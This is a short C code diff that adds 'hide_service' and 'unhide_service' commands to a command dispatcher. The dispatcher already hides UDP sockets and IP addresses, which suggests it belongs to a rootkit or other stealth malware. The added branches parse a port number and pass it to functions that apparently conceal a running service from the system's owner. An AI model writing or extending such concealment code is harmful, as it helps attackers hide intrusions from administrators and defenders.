@@ -92,6 +92,18 @@ execute_command (void)
 			unhide_udp_socket(port);
 		}
 		
+	} else if(strcmp(command_buffer, "hide_service") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			hide_service(port);
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_service") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			unhide_service(port);
+		}
+		
 	} else if(strcmp(command_buffer, "hide_ip") == 0) {
 		if(param_counter > 0) {
 			/* convert ip string to an int array */
